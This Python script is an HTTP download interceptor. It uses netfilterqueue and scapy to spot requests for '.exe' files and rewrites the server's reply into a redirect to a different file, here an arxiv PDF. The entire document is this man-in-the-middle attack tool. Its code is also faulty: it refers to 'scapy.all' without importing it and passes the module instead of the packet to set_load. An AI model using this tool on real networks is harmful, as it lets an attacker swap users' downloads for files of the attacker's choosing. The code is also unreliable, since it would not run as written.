#!/usr/bin/env python

import netfilterqueue
from scapy.packet import Raw
from scapy.layers.inet import IP, TCP

ack_list = []

def set_load(packet, load):
    print(packet.show())
    packet[scapy.all.Raw].load = load

    del packet[scapy.all.IP].len
    del packet[scapy.all.IP].chksum
    del packet[scapy.all.TCP].chksum

    return packet

def process_packet(packet):
    
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.all.Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            # print("HTTP Request")
            if ".exe".encode() in scapy_packet[scapy.all.Raw].load:
                print("[+] exe request detected.") 
                ack_list.append(scapy_packet[scapy.all.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[TCP].sport == 80:
            # print("HTTP Response")
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.all.TCP].seq)
                print("[+] Modifying download file")
                print(scapy_packet.show())
                mod_packet = set_load(scapy, b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n")

                packet.set_payload(bytes(mod_packet))

    # print(packet.get_payload())
    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

